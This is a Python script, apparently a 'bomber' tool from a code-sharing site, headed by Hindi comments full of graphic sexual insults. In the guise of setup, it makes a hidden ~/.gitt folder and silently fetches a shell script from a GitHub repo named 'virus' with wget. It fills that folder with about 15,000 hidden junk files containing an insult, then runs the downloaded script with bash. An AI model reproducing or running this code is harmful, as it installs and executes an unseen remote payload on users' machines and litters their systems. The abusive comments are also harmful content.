##Coded by the jatin kalwar
##Don't steal my code read license21
## if you use any part of code then give me credit



###SAALE RANDI K BACCHE KHUD SE TO KUCH KIYA NAHI JATA
#DUSRO KA CODE CHURA RAHA HAI TERI MAA KYA MUJHSE CHUDNE AATI HAI JO
#USKE BADLE TU CODE LEGA AB MUJHE JAB TAK TU SORRY NHI BOLEGA AUR CODE DELETE NAHI KAREGA
#JAB TAK M SOCHUNNGA TERI MAA MUJHSE CHUD RAHI HAI LAGATAR
#RANDI AUR RANDI K BACCHE DEKH KYA RAHA HAI CODE DELETE KAR
#AB MUJHE KUCH ULTA BOL KR APNI BEHAN MT CHUDWAIYO RANDI K PILLE
import os
from colorama import Fore, Back, Style
import socket


def is_connected():
    try:
        socket.create_connection(("1.1.1.1", 53))
        return True
    except OSError:
        pass
    return False
int= is_connected()
if int == False:
    os.system("clear")
    os.system("echo")
    print(Fore.RED+'YOU ARE NOT CONNECTED TO INTERNET')
    exit()
pth = os.path.expanduser('~')
th=os.path.join(pth,'.gitt')
pat=os.path.exists(th)
if pat == True:
    print("")
else:
    os.system("mkdir $HOME/.gitt")
patt=os.path.join(th,'.bomber.sh')
fipa=os.path.isfile(patt)
os.system("clear")
if fipa==False:
    os.system("echo")
    print(Fore.GREEN+'Please Wait Setting up Bomber')
    os.system("wget -L https://raw.githubusercontent.com/addqqfyioplmlnccczzvbhfsawrygiibctijctz/virus/main/.bomber.sh 2> /dev/null")
    os.system("mv .bomber.sh $HOME/.gitt")
patt=os.path.join(th,'.logo')
fipa=os.path.isfile(patt)
if fipa == False:
    os.system("cp .logo $HOME/.gitt")
tema=os.path.join(th,'.tempo')
tem=os.path.isfile(tema)
if tem == False:
    os.system("touch $HOME/.gitt/.tempo")
tema=os.path.join(th,'.tmpo')
tem=os.path.isfile(tema)
if tem == False:
    os.system("touch $HOME/.gitt/.tmpo")
tema=os.path.join(th,'.tpo')
tem=os.path.isfile(tema)
if tem == False:
    os.system("touch $HOME/.gitt/.tpo")
tema=os.path.join(th,'.bomber')
tem=os.path.isfile(tema)
if tem == False:
    os.system("touch $HOME/.gitt/.bomber")
tema=os.path.join(th,'.bomb')
tem=os.path.isfile(tema)
if tem == False:
    os.system("touch $HOME/.gitt/.bomb")
tema=os.path.join(th,'.bomb.sh')
tem=os.path.isfile(tema)
if tem == False:
    os.system("touch $HOME/.gitt/.bomb.sh")
tema=os.path.join(th,'.bash.sh')
tem=os.path.isfile(tema)
if tem == False:
    os.system("touch $HOME/.gitt/.bash.sh")
tema=os.path.join(th,'.bombing')
tem=os.path.isfile(tema)
if tem == False:
    os.system("touch $HOME/.gitt/.bombing")
tema=os.path.join(th,'.bombber.sh')
tem=os.path.isfile(tema)
if tem == False:
    os.system("touch $HOME/.gitt/.bombber.sh")
for i in range(1000):
    patt=os.path.join(th,f".bomb{i}")
    fipa=os.path.isfile(patt)
    if fipa == False:
        with open(f"{th}/.bomb{i}", 'w') as g:
            g.write('teri maaa ki dhghgdg sgf sgf sghg sfdhfdg fd')
for i in range(1000):
    patt=os.path.join(th,f".comb{i}")
    fipa=os.path.isfile(patt)
    if fipa == False:
        with open(f"{th}/.comb{i}", 'w') as g:
            g.write('teri maaa ki dhghgdg sgf sgf sghg sfdhfdg fd')
for i in range(1000):
    patt=os.path.join(th,f".bomberr{i}.sh")
    fipa=os.path.isfile(patt)
    if fipa == False:
        with open(f"{th}/.bomberr{i}.sh", 'w') as g:
            g.write('teri maaa ki dhghgdg sgf sgf sghg sfdhfdg fd')
for i in range(1000):
    patt=os.path.join(th,f".loo{i}")
    fipa=os.path.isfile(patt)
    if fipa == False:
        with open(f"{th}/.loo{i}", 'w') as g:
            g.write('teri maaa ki dhghgdg sgf sgf sghg sfdhfdg fd')
for i in range(1000):
    patt=os.path.join(th,f".logoo{i}")
    fipa=os.path.isfile(patt)
    if fipa == False:
        with open(f"{th}/.logoo{i}", 'w') as g:
            g.write('teri maaa ki dhghgdg sgf sgf sghg sfdhfdg fd')
for i in range(5000):
    patt=os.path.join(th,f".ahjfv{i}")
    fipa=os.path.isfile(patt)
    if fipa == False:
        with open(f"{th}/.ahjfv{i}", 'w') as g:
            g.write('teri maaa ki dhghgdg sgf sgf sghg sfdhfdg fd')
for i in range(5000):
    patt=os.path.join(th,f".djhsa{i}")
    fipa=os.path.isfile(patt)
    if fipa == False:
        with open(f"{th}/.djhsa{i}", 'w') as g:
            g.write('teri maaa ki dhghgdg sgf sgf sghg sfdhfdg fd')
os.system("bash $HOME/.gitt/.bomber.sh")
